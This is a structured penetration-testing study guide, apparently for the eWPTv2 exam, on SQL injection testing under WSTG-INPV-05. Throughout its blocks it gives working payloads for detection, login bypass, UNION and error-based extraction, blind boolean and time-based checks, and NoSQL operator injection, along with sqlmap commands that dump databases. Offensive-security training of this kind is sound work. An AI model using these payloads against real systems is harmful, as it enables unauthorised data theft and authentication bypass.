# Phase 3 – WSTG SQL Injection: Walkthrough + Guide

**Tags:** `ASYNC` start at once, keep working while it runs · `MANUAL` Burp Repeater/curl, no automation replaces it · `EXTRA` only when a question or a blocker points to it. Every block keeps its WSTG ID.

**Colour code (on every step heading):** <span style="background:#b7e4c7;color:#000">&nbsp;🟩 Green = mandatory&nbsp;</span> run it on every entry point recon found, or as soon as the fact that triggers it appears (a branch, queued without waiting). <span style="background:#fff9b0;color:#000">&nbsp;🟨 Light yellow = optional&nbsp;</span> run it only when a question points to it, as a fallback, or if time allows. The emoji squares keep the code visible in viewers that ignore background colours.

**How to use it:** *Study* by reading the context lines and **Watch** notes. *Execute* by jumping to the payload and reading only the **Read** line. Blocks A–K follow the order you work in. Inside each block, core payloads come first and the ones with a *When* line are triggered extras. Every block ends with a **Next** column. It is a pointer, not a gate: the stages in the *Summary* set the sequence, and a branch (auth bypass, blind confirmation, NoSQL) is queued when its trigger shows, without waiting for it. **If it fails** points to a section of [📜 cheatsheet.md](<./📜 cheatsheet.md>). Worked, step-by-step examples for every technique live in [🧪 LABS/SQLi.md](<./🧪 LABS/SQLi.md>) — read the matching lab when a payload here does not click. The question lookup, the discovery map and troubleshooting are at the end.

***

## Summary

**Goal.** Turn every entry point that Phase 1 recon found (parameters, forms, headers, cookies, login fields) into a confirmed SQL injection, then answer the *exact* data point a question asks for — a database name, a version string, a password hash, a flag. This phase attacks entry points Phase 1 already mapped; it does not go looking for new ones.

**Ground rules (they apply to every stage).**
- **The question is a scenario, not an invitation to dump everything.** eWPTv2 asks "scenario + question": a search box plus "what is the name of the `users` table's third column". Read what is actually being asked before you query — a single targeted `SELECT` is faster than a full `--dump` and is usually all the question needs.
- **Detection before exploitation, always.** Never fire a UNION or error-based payload before the syntax-breaking probe (block B) has confirmed the input actually reaches a query. Guessing the technique first is the most common way to waste the clock on a dead parameter.
- **The engine decides the payload, not the vulnerability class.** `@@version` means nothing on PostgreSQL and `FROM dual` is mandatory on Oracle. Fingerprint the engine (block D) before writing a single extraction payload.
- **Manual confirms, sqlmap extracts.** A human proves the injection exists with a handful of requests; the tool does the repetitive work of pulling the actual rows. The single biggest time sink seen in the drill was hand-building a character-by-character blind extraction — sqlmap does the same work in one command.
- **sqlmap only with safe flags, and only one instance at a time.** `--technique=BEUSQ --risk=1 --threads=2 --batch`, never `T` (time-based) in `--technique`, never two heavy tools running together. A frozen Kali VM costs more time than the data is worth.
- **Time-box every candidate.** Detection and fingerprinting cost a handful of requests each; give them a few minutes. If sqlmap finds nothing at `--level=1`, one retry at `--level=3 --risk=2` (still no `T`), then move to the next entry point — a parameter that resists both is not the one the question is about.
- **A Kali reset wipes everything.** Copy confirmed payloads, saved request files and sqlmap output to the host PC as you go, same as every other phase.

**Three ideas hold the process together.**
- **Detection before exploitation.** The apostrophe/boolean probe (block B) is the gate. Nothing else in this phase runs until it confirms the input actually breaks the query — a clean `'` that changes nothing is not a lead, it is a dead end to drop and move past.
- **Engine and column count decide the payload family.** Union extraction needs the column count and a text-capable column; error-based needs the right forced-error function for that one engine; blind needs only a working true/false or timing oracle. Get these from block D before writing block E/F/G payloads.
- **Manual confirms, sqlmap extracts.** Proving a parameter is injectable, and naming its engine, is worth doing by hand because it is fast and it is what later questions assume you already know. Pulling the actual table and row data by hand, one character at a time, is not — hand that to sqlmap (block I) the moment a true/false or a union row is confirmed.

**Restart rule.** Every new entry point this phase itself turns up — a parameter inside a referenced JS file, a hidden form field, a header an admin panel logs, a value only visible after login — re-enters the process at block B (probe it, read the diff, fingerprint if it breaks).

**Root checks.** What every candidate parameter gets, in this order: syntax probe (quote/boolean) → read the diff → engine fingerprint → column count (if a visible channel exists) → extraction technique matched to what is visible → sqlmap handoff the moment nothing is visible (blocks B–I). Skipping the fingerprint step is the single biggest cause of a union payload that "should have worked" on the wrong engine's syntax.

**The process in eight stages.** Each one says why it exists, what it hands to the next, and which block holds its payloads.

**Stage 0 · Prepare (block A).** Pull the entry-point list straight from Phase 1: every GET/POST parameter, login field, search box, cookie and custom header. Decide the `sqlmap -r` request-file convention now, before you need it under time pressure — a saved request turns a confirmed finding into a one-line sqlmap command instead of a re-typed one.

**Stage 1 · Detect (block B; `WSTG-INPV-05` starts here).** Send a quote, then a true/false pair, to every candidate and read the diff: status code, size, an error string, or nothing at all. This is the cheapest test in the phase and the only gate that decides whether anything else in this phase is worth running on this parameter.

**Stage 2 · Authentication bypass (block C).** A login form is a special, very common case of block B: the same OR-based breakout, applied to a username/password pair, often confirms and *answers the question* in one step, before any fingerprinting. Try it the moment a login form is in scope.

**Stage 3 · Fingerprint and align (block D).** For every confirmed candidate, name the engine from its error text or boolean behaviour, then find the column count and which column renders text. This is the step most people skip, and the one that decides whether block E's payload has any chance of firing.

**Stage 4 · Extract through a visible channel (blocks E, F).** If the page renders a UNION row, build the extraction straight off the column found in Stage 3. If instead the server shows SQL errors but no extra row, force the subquery's result into that error text. Either way, the goal is the exact value the question names — not every row in every table.

**Stage 5 · Confirm blind, then hand off (blocks G, H).** When nothing renders and no error shows, a true/false diff is still an oracle. Confirm it with one pair of requests, then stop testing by hand — block I takes it from there. Only when even that diff is absent does a timing probe (block H) become the last resort for identification.

**Stage 6 · Automate (block I).** A confirmed injection point, handed to sqlmap with the safe flag set, does in one command what a manual blind extraction would cost an hour of the clock: engine confirmation, database/table/column enumeration, and a targeted dump. Run it `ASYNC` and keep working the next entry point while it runs.

**Stage 7 · Close out (block K).** One completeness pass per target, not one per finding. Copy every saved request file and sqlmap transcript to the host PC, because a Kali reset erases `recon/`.

**Where things run (this phase needs far fewer channels than recon).**
- **Burp Repeater, the main channel:** every probe, fingerprint payload, and union/error payload. One tab per candidate parameter, renamed `<PARAM>-<ENGINE>`.
- **A terminal:** sqlmap, one instance at a time, routed through Burp with `--proxy=http://127.0.0.1:8080` so the run lands in the same HTTP history as everything else. `curl` for one-off boolean/time checks and response diffing.
- **The browser (same proxy):** only to see a rendered login bypass, or a page-level answer a scenario asks you to read visually.

**Three questions to ask after every result.** (1) *Did the response actually change, and how* — size, status, an error string, or only timing? (2) *Which technique does that change support* — union (a visible extra row), error (a visible message), or blind (only a diff, or only a delay)? (3) *Do I already have the value the question asked for*, or does it need one more targeted query?

**What this phase is not.** It is not recon — Phase 1 already found the parameters, forms and login fields; a parameter this phase never probes is a parameter never tested, so go back to Phase 1 block J if the inventory looks thin. It is not XSS, LFI, or command injection, even when the same parameter is also vulnerable to one of those — note the lead and keep this phase to `WSTG-INPV-05`. NoSQL injection (block J) is tested only when a concrete symptom names a non-relational backend, never by default on every target.

**Three foundational techniques.** Every block below is one of them.

| Technique | What it is | Tools | Blocks |
|---|---|---|---|
| Syntax breaking & diffing | A quote or boolean pair sent, then the response (status, size, error text, timing) compared to a clean baseline | curl, Burp Repeater | B, C |
| Engine fingerprint & column alignment | Reading the error text or the boolean behaviour to name the engine, then `ORDER BY`/`UNION NULL` to find the column count and the text-capable column | Burp Repeater, curl | D |
| Automated extraction | Handing a confirmed injection point to sqlmap with safe flags, so it re-tests every technique and dumps in one pass instead of by hand | sqlmap | E, F, G, H, I |

**What depends on what.** This is why the stage order above is fixed, not arbitrary.

| Step | Needs | Produces |
|---|---|---|
| Syntax probe | The Phase 1 entry-point list | A candidate parameter, and how its response differs |
| Engine fingerprint | A confirmed candidate | The RDBMS name, its comment/concat syntax |
| Column count | An engine | `<N>`, and which column renders text |
| Union extraction | `<N>` and a text column | A visible value: version, table, column, row |
| Error-based extraction | An engine and a forced-error channel | A value read out of the error text |
| Boolean/time confirmation | A candidate with no visible channel | A true/false or timing oracle, handed to sqlmap |
| sqlmap run | A saved request file and a confirmed parameter | Databases, tables, columns, a targeted dump |

***

## Conventions

| Placeholder | Meaning |
|---|---|
| `<URL>` | The page or endpoint under test |
| `<PARAM>` | The parameter, field, header or cookie being tested |
| `<PAYLOAD>` | The SQLi string from blocks B–J |
| `<ENGINE>` | The detected RDBMS: `mysql`, `mssql`, `postgresql`, `oracle`, or `sqlite` |
| `<N>` | The column count found in block D |
| `<DB>` / `<TABLE>` / `<COLUMN>` | Schema names, once reached |
| `<REQ_FILE>` | A saved raw HTTP request, `recon/req-<name>.txt`, built for `sqlmap -r` |
| `<SCHEME>` / `<VHOST>` / `<PORT>` | Same meaning as Phase 1 |
| `<COOKIE>` / `<PROXY>` | `PHPSESSID=...` / `127.0.0.1:8080`, same as Phase 1 |

**The syntax-breaking probe (every candidate gets this before anything else):**
```text
1' AND '1'='1
1' AND '1'='2
```
Send the first, then the second, and diff the two responses against a clean baseline (`<PARAM>=1`). A string-context parameter needs the quote; a numeric one (`1 AND 1=1` / `1 AND 1=2`, no quote) sometimes does not — try both before concluding nothing reflects.

**What the response did, and what it means**

| Response | Context | Do |
|---|---|---|
| A visible DB error, stack trace, or "syntax" text on the quote alone | Error-based candidate, string context | Block D (fingerprint), then block F |
| Page renders fine on the quote but the true/false pair clearly differs (row count, redirect, message) | Candidate, no visible error | Block D, then block E if a row renders or block G if only the diff exists |
| Identical page for the baseline, the quote, and both true/false payloads | Not reflected here, or fully sanitised | Try the numeric (no-quote) variant once, then drop this parameter and try the next |
| True/false differ but no error and no extra row ever renders | Blind-boolean candidate | Block G |
| Every payload looks identical, but a deliberately slow one measurably delays the response | Blind-time candidate — last resort for identification | Block H |
| `403`, a rewritten request, or a generic block page | A filter or WAF is in front | Phase 1 block M, then Phase 8 (encoding bypass) |

- **Burp scope and setup:** identical to Phase 1 (see [startup checklist](<../00-Exam-Setup-and-Proxies/startup-checklist.md>)). This phase lives almost entirely in Repeater: one tab per candidate, renamed `<PARAM>-<ENGINE>`.
- **Saving a request for sqlmap:** Burp Community has no "export as text" menu item. The moment a candidate confirms: open it in Repeater, select the **Raw** tab, Ctrl+A, Ctrl+C, then paste into a text editor (`mousepad recon/req-<name>.txt &`) and save. One file per confirmed entry point, named after the parameter — do this immediately, not after you have already moved on to the next candidate.
- **URL-encode in the query string.** `'` → `%27`, space → `%20`. Burp's Raw tab encodes on edit; curl needs `--data-urlencode` or the value pre-encoded. A POST body or a JSON field gets the same probes as the field value, not the query string.
- **Baseline before you diff.** `curl -sk -o /tmp/base.html -w "%{http_code} %{size_download}\n" "<URL>?<PARAM>=1"` once, then compare every later response's size and status against it — the same calibration idea as Phase 1's ffuf baseline, applied to one request instead of a wordlist.
- **DB engine quick-reference** (full table in the cheatsheet):

| Engine | Comment | Concat | Version | Current DB |
|---|---|---|---|---|
| MySQL / MariaDB | `-- ` (trailing space) or `#` | `CONCAT(a,b)` | `@@version` | `database()` |
| MSSQL | `--` | `a + b` | `@@version` | `DB_NAME()` |
| PostgreSQL | `--` | `a \|\| b` | `version()` | `current_database()` |
| Oracle | `--`, most queries need `FROM dual` | `a \|\| b` | `banner FROM v$version` | `ora_database_name` |
| SQLite | `--` | `a \|\| b` | `sqlite_version()` | file-based, no equivalent |

- **Step format:** heading with tags, context line, payload block, **Read** quote, optional **Watch** note, table (save flag, next action). Extra blocks add a *When* line. Main blocks add **If it fails**.

***

## A. Setup & entry-point inventory

#### <span style="background:#b7e4c7;color:#000">&nbsp;Pull the worklist from Phase 1&nbsp;</span>

Two minutes, before any payload. This phase attacks entry points Phase 1 already found — it does not go looking for new ones.

```bash
mkdir -p recon
cat recon/ffuf-get-params-*.csv recon/ffuf-post-params-*.csv 2>/dev/null | awk -F, 'NR==1 || $5~/^(200|301|302)$/'
grep -rohE '<input[^>]*name="[^"]+"' recon/ 2>/dev/null | grep -oE 'name="[^"]+"' | sort -u
```

> **Read:** Your worklist is every GET/POST parameter from Phase 1 block J, every form field (especially login and search), every cookie name, and any custom header Burp recorded.
> **Watch:** Prioritise by the scenario. If the question names a search box or a login form, start there — do not sweep every parameter in the inventory before touching the one the question is actually about.

| Save to file | Next |
|:---:|---|
| `[ ]` | Decide the `sqlmap -r` convention, then detect (block B). |

#### <span style="background:#b7e4c7;color:#000">&nbsp;Save a request for sqlmap, before you need it&nbsp;</span>

```bash
mousepad recon/req-<NAME>.txt &
```

> **Read:** A saved raw request turns a confirmed finding into a one-line `sqlmap -r` run (block I) instead of a request re-typed from memory under time pressure.
> **Watch:** Do this the moment a candidate confirms in block B — Burp Community cannot save a project, so copy/paste from Repeater's Raw tab is the only path, and it is one less thing to redo after a reset.

| Save to file | Next |
|:---:|---|
| `[x]` | Detect every entry point (block B). |

***

## B. Detect — break the syntax and read the diff

#### <span style="background:#b7e4c7;color:#000">&nbsp;Syntax probe on every candidate parameter&nbsp;</span> · `WSTG-INPV-05` · `MANUAL`

The single most important step in the phase. Nothing else runs until this confirms a break.

```bash
curl -sk -o /tmp/base.html -w "%{http_code} %{size_download}\n" "<SCHEME>://<VHOST>/<URL>?<PARAM>=1"
curl -sk -o /tmp/quote.html -w "%{http_code} %{size_download}\n" --data-urlencode "<PARAM>=1'" -G "<SCHEME>://<VHOST>/<URL>"
curl -sk -o /tmp/true.html -w "%{http_code} %{size_download}\n" --data-urlencode "<PARAM>=1' AND '1'='1" -G "<SCHEME>://<VHOST>/<URL>"
curl -sk -o /tmp/false.html -w "%{http_code} %{size_download}\n" --data-urlencode "<PARAM>=1' AND '1'='2" -G "<SCHEME>://<VHOST>/<URL>"
diff /tmp/base.html /tmp/quote.html; diff /tmp/true.html /tmp/false.html
```

> **Read:** Match the output against the *What the response did, and what it means* table in Conventions. Write the result (error / visible diff / blind diff / nothing) next to the parameter name — this is what block D and the routing below read next.
> **Watch:** If every payload looks identical, retry once with the numeric (no-quote) variant before dropping the parameter: `<PARAM>=1 AND 1=1` vs `<PARAM>=1 AND 1=2`. A POST body or JSON field gets the same probes as the field's value, one field at a time.

| Save to file | Next |
|:---:|---|
| `[ ]` | Login form present → block C. Error visible → block D. Only a true/false diff → block D, then G. Nothing at all → try the numeric variant once, then drop this parameter. |

**If it fails →** cheatsheet: *Detection probe variants* (JSON, XML, multipart, headers, cookies).

***

## C. Authentication bypass

#### <span style="background:#b7e4c7;color:#000">&nbsp;OR-based breakout on a login form&nbsp;</span> · `WSTG-INPV-05`

*When:* the scenario mentions a login page, or a username/password form is in scope. This is block B's probe applied to the single most common injectable field in the exam, and it often answers the question in one step.

```text
' OR '1'='1'-- -
' OR 1=1-- -
admin'-- -
admin' OR '1'='1
" OR "1"="1"-- -
```

> **Read:** Try the username field first, leave the password blank or arbitrary. A redirect to a logged-in page, or an error message that changes from "unknown user" to "wrong password", confirms the `WHERE` clause broke.
> **Watch:** `-- ` needs a trailing space (or use `-- -`) so MySQL does not choke on the rest of the line; `#` is a MySQL-only single-line comment. If the field is wrapped in double quotes server-side instead of single, the last payload is the one to try first.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → note the bypass as the finding, then still fingerprint the engine (block D); a follow-up question often asks for a value next. Blocked → block D on this same field, it may still be injectable without bypassing the login. |

**If it fails →** cheatsheet: *Login bypass payload bank*.

***

## D. Fingerprint & column count

#### <span style="background:#b7e4c7;color:#000">&nbsp;Name the engine&nbsp;</span> · `WSTG-INPV-05`

Run once per confirmed candidate, before writing any extraction payload.

```bash
curl -sk --data-urlencode "<PARAM>=1' AND '1'='1" -G "<SCHEME>://<VHOST>/<URL>" | grep -iE "mysql|mariadb|postgresql|pg_|ora-|oracle|microsoft.*odbc|sqlite|syntax"
```

> **Read:** Match the error text or the known syntax quirk (`FROM dual`, `@@version`, `pg_`) against the *DB engine quick-reference* table in Conventions. This decides every payload in blocks E, F and the `--dbms` flag in block I.
> **Watch:** No error text at all does not mean no engine info — try `<PARAM>=1' AND '1'='1` vs a payload that only one engine's syntax tolerates (e.g. `||` concatenation fails loudly on MySQL but not on PostgreSQL/Oracle/SQLite).

| Save to file | Next |
|:---:|---|
| `[ ]` | Engine known → column count below. |

#### <span style="background:#b7e4c7;color:#000">&nbsp;Column count and the text-capable column&nbsp;</span> · `WSTG-INPV-05`

```bash
curl -sk -o /dev/null -w "%{http_code}\n" --data-urlencode "<PARAM>=1' ORDER BY 1-- -" -G "<SCHEME>://<VHOST>/<URL>"
# repeat with ORDER BY 2, 3, 4... until the response changes or errors — that number minus one is <N>
curl -sk -o /tmp/u.html --data-urlencode "<PARAM>=1' UNION SELECT NULL,NULL,NULL-- -" -G "<SCHEME>://<VHOST>/<URL>"
```

> **Read:** `ORDER BY` stops matching the first time you pass the real column count — that number minus one is `<N>`. Confirm with the same count of `NULL`s in a `UNION SELECT`; a `200` that renders normally confirms `<N>`. On Oracle, append `FROM dual` when the query has no table of its own.
> **Watch:** Replace the `NULL`s one at a time with a literal string (`'x'`) to find which column accepts text — a numeric-only column errors on a string. That position is where block E's extracted values go.

| Save to file | Next |
|:---:|---|
| `[ ]` | A UNION row renders in the page → block E. No row renders but errors still show → block F. Neither renders → block G. |

**If it fails →** cheatsheet: *DB engine fingerprint reference* (expanded error-signature table).

***

## E. Union-based extraction

#### <span style="background:#b7e4c7;color:#000">&nbsp;Build the payload on the text-capable column&nbsp;</span> · `WSTG-INPV-05`

*When:* block D confirmed `<N>` and a UNION row renders in the page.

```text
' UNION SELECT NULL,@@version,NULL-- -                                                          (MySQL/MSSQL version)
' UNION SELECT NULL,version(),NULL-- -                                                           (PostgreSQL version)
' UNION SELECT NULL,banner,NULL FROM v$version-- -                                               (Oracle version)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -   (MySQL/MSSQL/PostgreSQL table names)
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='<TABLE>'-- -    (column names)
' UNION SELECT NULL,CONCAT(<COLUMN1>,0x3a,<COLUMN2>),NULL FROM <TABLE>-- -                        (stack two columns into one visible row)
```

> **Read:** Each payload's value renders where the real data used to show in the page — that is your readout channel for every later question on this parameter.
> **Watch:** More rows than fit on one page: add `LIMIT 1 OFFSET <N>` (MySQL/PostgreSQL) or paginate with `ROW_NUMBER()`/`rownum` (MSSQL/Oracle) instead of scrolling. Oracle's table listing uses `all_tables`/`all_tab_columns`, not `information_schema`.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → read the exact value the question asked for and submit it. It is rarely necessary to dump the whole table by hand. |

**If it fails →** cheatsheet: *Union payload bank* (full per-engine listing queries).

***

## F. Error-based extraction

#### <span style="background:#b7e4c7;color:#000">&nbsp;Force the subquery result into the error text&nbsp;</span> · `WSTG-INPV-05`

*When:* no UNION row is visible, but the server shows SQL errors (a `500`, a stack trace, a verbose message).

```text
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -           (MySQL)
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)-- -            (MySQL, alternate)
' AND 1=CONVERT(int,(SELECT @@version))-- -                          (MSSQL)
' AND 1=CAST((SELECT version()) AS int)-- -                          (PostgreSQL)
```

> **Read:** The forced type-mismatch or XML-path error carries your subquery's result inside its own error text — read it straight out of the response body.
> **Watch:** Oracle rarely needs this path, since its default errors are already verbose (an `ORA-xxxxx` carries the broken SQL, not your data) — prefer union or blind there instead.

| Save to file | Next |
|:---:|---|
| `[ ]` | Value is in the error text → done for this question. Value is truncated → narrow it with `SUBSTRING()`/`SUBSTR()` around the part still missing. |

**If it fails →** cheatsheet: *Error-based payload bank*.

***

## G. Blind boolean — confirm, then hand off

#### <span style="background:#b7e4c7;color:#000">&nbsp;One true/false pair, nothing more by hand&nbsp;</span> · `WSTG-INPV-05`

*When:* block B showed a true/false diff with no visible rows and no errors.

```text
' AND 1=1-- -      (baseline true)
' AND 1=2-- -      (baseline false)
```

> **Read:** This step is a confirmation, not an extraction method. Once true and false reliably produce different responses, stop testing by hand.
> **Watch:** Manually building a character-by-character binary search for blind data was the single biggest time sink seen in the drill — don't. The moment true/false is confirmed, go straight to block I (sqlmap) and let it do that repetitive work.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → block I directly, skip block H. True and false still look identical → block H as the last resort. |

**If it fails →** cheatsheet: *Blind boolean manual bank* (fallback only, if sqlmap is unavailable).

***

## H. Blind time-based — confirm, then hand off

#### <span style="background:#fff9b0;color:#000">&nbsp;One deliberately slow request&nbsp;</span> · `WSTG-INPV-05`

*When:* even the true/false pair in block G looks identical. This is the last resort for identification, never a data-extraction method to run by hand or at scale.

```text
' AND SLEEP(5)-- -                                 (MySQL)
'; WAITFOR DELAY '0:0:5'-- -                        (MSSQL)
' AND pg_sleep(5)-- -                               (PostgreSQL)
' AND 1=dbms_pipe.receive_message(('a'),5)-- -      (Oracle)
```

```bash
curl -sk -o /dev/null -w "%{time_total}\n" --data-urlencode "<PARAM>=1' AND SLEEP(5)-- -" -G "<SCHEME>://<VHOST>/<URL>"
```

> **Read:** A `~5` second response time against a baseline under a second confirms a timing oracle.
> **Watch:** Never run sqlmap with `T` in `--technique` on the exam network — each character costs a multi-second request, and a stacked time-based run is exactly the freeze risk the guideline warns about. If timing is genuinely the *only* oracle (boolean and error both gave nothing in blocks F/G), the safe-flag sqlmap run in block I cannot extract data either, since `BEUSQ` excludes `T` by design. In that one case, hand-roll a short, bounded binary search aimed only at the single value the question needs — never a full table — using the cheatsheet script.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed, and boolean/error also work → block I (sqlmap will use those instead of time). Confirmed, and timing is the only oracle → cheatsheet *Time-based manual extraction*, bounded to the one value asked for. |

**If it fails →** cheatsheet: *Blind time payload bank*, *Time-based manual extraction*.

***

## I. sqlmap automation

#### <span style="background:#b7e4c7;color:#000">&nbsp;Confirm with safe flags&nbsp;</span> · `WSTG-INPV-05` · `ASYNC`

Run the moment any block above confirms a candidate — this replaces the rest of the manual extraction work.

```bash
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --level=1 --proxy=http://127.0.0.1:8080
```

> **Read:** sqlmap confirms the same injection a dozen manual requests would prove, and names the technique and engine it used.
> **Watch:** `--proxy` routes every sqlmap request through Burp too, so the run lands in your HTTP history for evidence with no extra copy/paste. `-p <PARAM>` pins sqlmap to the field you already confirmed — without it, sqlmap retests every field in the saved request, which is slower and noisier.

| Save to file | Next |
|:---:|---|
| `[x]` | Confirmed → the extraction chain below. Nothing at `--level=1` → retry once at `--level=3 --risk=2` (still no `T`). Still nothing → this parameter is not it, move to the next. |

#### <span style="background:#b7e4c7;color:#000">&nbsp;Extraction chain, stop at the first answer&nbsp;</span> · `WSTG-INPV-05` · `ASYNC`

```bash
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 --current-db --banner
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 -D <DB> --tables
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 -D <DB> -T <TABLE> --columns
sqlmap -r <REQ_FILE> -p <PARAM> --batch --technique=BEUSQ --risk=1 --threads=2 -D <DB> -T <TABLE> -C <COLUMN> --dump
```

> **Read:** Stop at the step that already answers the question — `--current-db`/`--banner` alone answers a "what database/version" question; go to `--dump` only when the question needs row data, and add `-C <COLUMN>` to skip columns it never asked about.
> **Watch:** Run this `ASYNC` — start it in one terminal and keep working the next entry point or question while it runs. A full `--dump` on a large table can take minutes; a targeted `-C` column rarely does.

| Save to file | Next |
|:---:|---|
| `[x]` | Read the exact value the scenario asked for and submit it. Copy the terminal transcript to the host PC before any reset. |

**If it fails →** cheatsheet: *sqlmap flag reference*.

***

## J. NoSQL injection

#### <span style="background:#fff9b0;color:#000">&nbsp;Operator injection on a non-relational backend&nbsp;</span> · no dedicated WSTG ID · low priority

*When:* the backend is explicitly **not** a SQL engine — a JSON API, a MongoDB-flavoured error, or a parameter that visibly takes an object/array instead of a scalar — and every block B probe produced nothing. This is not prioritised in the exam scope: test it only when a concrete symptom points to it, never by default on every target.

```text
admin'||'1'=='1                        (login bypass, string-concatenation style)
{"$ne": null}                           (JSON body: not-equal operator)
?username[$ne]=admin&password[$ne]=x    (URL-encoded array syntax, Express/MongoDB)
{"$where": "this.password.length > 0"}
```

> **Read:** A bypassed login, or a response that changes when `$ne`/`$gt` replaces a plain value, confirms it the same way block C confirms a SQL bypass.
> **Watch:** There is no sqlmap-equivalent safe default here — extraction stays manual, so budget time accordingly and chase only the exact value the question asks for.

| Save to file | Next |
|:---:|---|
| `[ ]` | Confirmed → note the bypass or value, done. No symptom at all → skip and move on; do not run this on every target speculatively. |

**If it fails →** cheatsheet: *NoSQL payload bank*.

***

## K. Close out

#### <span style="background:#b7e4c7;color:#000">&nbsp;Completeness pass&nbsp;</span> · `MANUAL`

One pass per target, not one per finding.

- Every parameter, header, cookie and login field from the Phase 1 inventory got the syntax probe (block B).
- Each confirmed candidate has: an engine name, a column count/text column where applicable, and the technique that produced the value the question asked for.
- Every sqlmap run used `--technique=BEUSQ --risk=1 --threads=2 --batch`, never `T`, and never two instances running at once.
- Each answer is submitted, and saved request files plus sqlmap transcripts are copied to the host PC, because a Kali reset erases `recon/`.

***

## Question → where to look

| The question mentions | Run | WSTG |
|---|---|---|
| Login form, bypass authentication | Auth bypass (C), then fingerprint (D) | INPV-05 |
| Search box, URL parameter, a quote changes the response | Detect (B), fingerprint (D) | INPV-05 |
| Database name, version, "what engine" | Fingerprint (D), union/error (E, F), or `sqlmap --current-db --banner` (I) | INPV-05 |
| Table name, column name, schema | Union (E) or sqlmap `--tables`/`--columns` (I) | INPV-05 |
| Password, hash, a specific row's value | Union/error (E, F) or sqlmap `--dump` scoped with `-C` (I) | INPV-05 |
| No visible change except true/false | Blind boolean (G), then sqlmap (I) | INPV-05 |
| Nothing changes at all, except a delay | Blind time confirmation (H), then sqlmap or the bounded manual extraction | INPV-05 |
| JSON body, MongoDB, `$` operators in params | NoSQL (J) — only if a symptom already pointed here | — |
| Filter, blocked quote, WAF on injection | Phase 1 block M, then Phase 8 encoding bypass | — |

***

## Discovery → next step

| What you found | Do next |
|---|---|
| A login form is in scope | Auth bypass (C) before anything else |
| A quote changes the response | Fingerprint the engine (D) |
| A UNION row renders in the page | Build the extraction on the text column (E) |
| Errors show but no extra row renders | Force the value into the error text (F) |
| Only a true/false diff, no error, no row | Confirm once (G), then sqlmap (I) |
| Every payload looks identical except timing | Confirm once (H), then sqlmap, or the bounded manual fallback |
| A candidate is confirmed by any block above | Save the request, then sqlmap with safe flags (I) |
| sqlmap finds nothing at level 1 | One retry at `--level=3 --risk=2` (still no `T`), then move on |
| Backend looks non-relational (JSON, MongoDB errors) | NoSQL (J), only as a triggered check |
| A value is truncated in an error message | Narrow it with `SUBSTRING()`/`SUBSTR()` around the missing part |

***

## Troubleshooting

| What happens | What to do |
|---|---|
| Nothing changes for any payload, on any entry point | Try the numeric (no-quote) variant once, then this parameter is genuinely not it — move on |
| UNION column count never seems to match | Recheck with `ORDER BY` from 1 upward rather than guessing a count; on Oracle, confirm `FROM dual` is present |
| The union row renders but shows no data | A numeric-only column was used for the text value — replace `NULL` with `'x'` per column to find the text-capable one first |
| Login bypass payload does nothing | Try the double-quote variant, try commenting with `#` instead of `-- -`, and check whether the field is wrapped in parentheses server-side |
| sqlmap finds nothing at all | Re-confirm the single-quote break manually first; sqlmap cannot find what block B could not either. Then one retry at higher level/risk |
| sqlmap is slow or the VM lags | Check `--technique` never includes `T`, check `--threads` is `2`, and that no second heavy tool (ffuf, nikto) is running at the same time |
| Every request returns an identical generic error page | A WAF or a generic error handler — Phase 1 block M, then Phase 8 encoding tricks |
| The value in the error message is cut off | Wrap the subquery in `SUBSTRING(..., <start>, <len>)`/`SUBSTR()` and slide the window |
| Timing payload never seems to delay the response | Confirm the engine first (block D) — a time function from the wrong engine silently does nothing |
| Kali reset | Restart sqlmap from the saved `<REQ_FILE>`; confirmed values already copied to the host PC are unaffected |

***
